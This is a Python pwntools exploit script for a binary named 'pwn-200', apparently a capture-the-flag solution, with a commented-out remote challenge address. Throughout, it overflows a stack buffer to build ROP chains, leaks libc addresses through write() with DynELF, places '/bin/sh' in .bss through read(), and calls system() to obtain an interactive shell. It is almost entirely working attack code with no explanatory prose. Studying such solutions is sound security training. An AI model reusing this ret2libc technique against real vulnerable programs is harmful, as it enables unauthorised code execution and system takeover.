#!/usr/bin/env python3
from pwn import *
elf = ELF("./pwn-200")
# context.update(binary=elf, log_level="DEBUG")
p = elf.process()
# p = remote('61.147.171.105', '60918')
# gdb.attach(p, '''
# 	b *0x0804855F
# 	''')

vuln_func_addr = 0x08048484 	# func read input 
start_addr = 0x080483d0			# func start | return to _start get to recover stack
bss_addr = 0x0804a020 			# "/bin/sh"
write_plt = elf.symbols['write']
write_got = elf.got['write']
read_plt = elf.symbols['read']
read_got = elf.got['read']

def leak(address):
  payload = b"A" * 112
  payload += p32(write_plt)
  payload += p32(vuln_func_addr)
  payload += p32(1)
  payload += p32(address)
  payload += p32(4)
  p.send(payload)
  data = p.recv(4)
  log.info("%#x => %s" % (address, (data or b'')))
  return data

print(p.recvline())
dynelf = DynELF(leak, elf=ELF("./pwn-200"))
system = dynelf.lookup("__libc_system", "libc") 
log.info("system LIBC address: " + hex(system))

# call _start => recover stack
payload2 = b"A" * 112
payload2 += p32(start_addr)
p.send(payload2)
print(p.recv())

# get shell
ppp_addr = 0x0804856c 	# : pop ebx ; pop edi ; pop ebp ; ret | pop para of read_plt
payload3 = b"A" * 112
payload3 += p32(read_plt)
payload3 += p32(ppp_addr)
payload3 += p32(0)
payload3 += p32(bss_addr)
payload3 += p32(8)
payload3 += p32(system) + p32(vuln_func_addr) + p32(bss_addr)
p.send(payload3)
p.sendline(b'/bin/sh\x00')


p.interactive()

